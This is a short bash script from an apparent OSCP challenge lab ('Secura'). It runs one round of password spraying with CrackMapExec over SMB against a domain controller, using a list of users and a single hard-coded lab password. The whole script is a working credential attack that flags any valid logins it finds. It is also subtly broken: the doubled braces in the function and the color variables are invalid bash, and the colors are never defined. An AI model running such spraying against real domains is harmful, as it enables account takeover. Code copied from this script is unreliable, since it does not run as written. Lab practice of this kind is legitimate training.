#!/bin/bash
#
# Spray Round 1
# Passwords: 1
#

DOMAIN="SECURA.YZX"
DC_IP="192.168.179.97"
USER_FILE="/home/kali/Desktop/KaliBackup/OSCP/challengeLabs/0_Secura/spray_output/users.txt"
OUTPUT_DIR="/home/kali/Desktop/KaliBackup/OSCP/challengeLabs/0_Secura/spray_output"


# Spray with CrackMapExec
spray_password() {{
    local password="$1"
    local round="$2"

    echo -e "${{BLUE}}[Round $round] Testing: $password${{NC}}"

    crackmapexec smb $DC_IP -u $USER_FILE -p "$password" -d $DOMAIN --continue-on-success 2>&1 | tee -a "$OUTPUT_DIR/spray_results.txt"

    # Check for successes
    if grep -q "\[\+\]" "$OUTPUT_DIR/spray_results.txt" 2>/dev/null; then
        echo -e "${{GREEN}}[+] Potential valid credentials found!${{NC}}"
    fi

    echo ""
}}

spray_password 'EricLikesRunning800' 1
